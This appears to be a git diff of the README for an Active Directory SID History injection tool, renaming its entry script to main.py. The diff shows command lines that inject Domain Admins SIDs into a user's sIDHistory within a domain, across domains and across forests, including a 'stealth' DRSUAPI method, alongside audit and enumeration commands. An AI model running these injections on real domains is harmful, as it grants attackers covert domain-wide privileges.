@@ -41,15 +41,15 @@ pip install -r requirements.txt
 
 ```bash
 # Same-domain: inject Domain Admins into user1
-python3 sidhistory.py -d lab1.local -u da-admin -p 'Password123!' --dc-ip 192.168.56.10 \
+python3 main.py -d lab1.local -u da-admin -p 'Password123!' --dc-ip 192.168.56.10 \
     --target user1 --inject domain-admins --force
 
 # Cross-domain: inject Domain Admins of lab2.local via trust resolution
-python3 sidhistory.py -d lab1.local -u da-admin -p 'Password123!' --dc-ip 192.168.56.10 \
+python3 main.py -d lab1.local -u da-admin -p 'Password123!' --dc-ip 192.168.56.10 \
     --target user1 --inject domain-admins --inject-domain lab2.local --force
 
 # Raw SID injection
-python3 sidhistory.py -d lab1.local -u da-admin -p 'Password123!' --dc-ip 192.168.56.10 \
+python3 main.py -d lab1.local -u da-admin -p 'Password123!' --dc-ip 192.168.56.10 \
     --target user1 --inject S-1-5-21-3522073385-2671856591-2684624930-512 --force
 ```
 
@@ -70,7 +70,7 @@ In a production environment with a single DC, the brief NTDS downtime is the mai
 
 ```bash
 # Cross-forest injection (pure RPC, no NTDS downtime)
-python3 sidhistory.py -d lab1.local -u da-admin -p 'Password123!' --dc-ip 192.168.56.10 \
+python3 main.py -d lab1.local -u da-admin -p 'Password123!' --dc-ip 192.168.56.10 \
     --target user1 --method drsuapi --source-user da-admin2 --source-domain lab2.local \
     --src-username da-admin2 --src-password 'Password123!' --src-domain lab2.local
 ```
@@ -94,7 +94,7 @@ DRSUAPI is the stealth option — pure RPC, no disk writes, no service creation,
 ### Query sIDHistory
 
 ```bash
-python3 sidhistory.py -d CORP.LOCAL -u admin -p 'Pass123' --dc-ip 10.0.0.1 \
+python3 main.py -d CORP.LOCAL -u admin -p 'Pass123' --dc-ip 10.0.0.1 \
     --query user1
 ```
 
@@ -103,24 +103,24 @@ python3 sidhistory.py -d CORP.LOCAL -u admin -p 'Pass123' --dc-ip 10.0.0.1 \
 Scans every object for sIDHistory entries with risk assessment (CRITICAL/HIGH/MEDIUM/LOW). Same-domain SIDs are almost always attack artifacts.
 
 ```bash
-python3 sidhistory.py -d CORP.LOCAL -u admin -p 'Pass123' --dc-ip 10.0.0.1 --audit
+python3 main.py -d CORP.LOCAL -u admin -p 'Pass123' --dc-ip 10.0.0.1 --audit
 
 # JSON export for SIEM
-python3 sidhistory.py -d CORP.LOCAL -u admin -p 'Pass123' --dc-ip 10.0.0.1 \
+python3 main.py -d CORP.LOCAL -u admin -p 'Pass123' --dc-ip 10.0.0.1 \
     --audit -o json --output-file audit.json
 ```
 
 ### Enumerate trusts
 
 ```bash
-python3 sidhistory.py -d CORP.LOCAL -u admin -p 'Pass123' --dc-ip 10.0.0.1 --enum-trusts
+python3 main.py -d CORP.LOCAL -u admin -p 'Pass123' --dc-ip 10.0.0.1 --enum-trusts
 ```
 
 ### SID lookup & presets
 
 ```bash
-python3 sidhistory.py -d CORP.LOCAL -u admin -p 'Pass123' --dc-ip 10.0.0.1 --lookup user1
-python3 sidhistory.py -d CORP.LOCAL -u admin -p 'Pass123' --dc-ip 10.0.0.1 --list-presets
+python3 main.py -d CORP.LOCAL -u admin -p 'Pass123' --dc-ip 10.0.0.1 --lookup user1
+python3 main.py -d CORP.LOCAL -u admin -p 'Pass123' --dc-ip 10.0.0.1 --list-presets
 ```
 
 ---
@@ -140,7 +140,7 @@ python3 sidhistory.py -d CORP.LOCAL -u admin -p 'Pass123' --dc-ip 10.0.0.1 --lis
 ## Architecture
 
 ```
-sidhistory.py                  CLI entry point & argument handling
+main.py                        CLI entry point & argument handling
   └── core/
       ├── attack.py            Orchestrator (wires everything together)
       ├── auth.py              Authentication (5 methods, ldap3 + impacket)
@@ -184,7 +184,7 @@ sidhistory.py                  CLI entry point & argument handling
 Default output is clean and minimal. Use `-v` for full debug traces (LDAP, SMB, RPC, SCMR).
 
 ```bash
-python3 sidhistory.py -d CORP.LOCAL -u admin -p 'Pass123' --dc-ip 10.0.0.1 --audit -v
+python3 main.py -d CORP.LOCAL -u admin -p 'Pass123' --dc-ip 10.0.0.1 --audit -v
 ```
 
 ## References
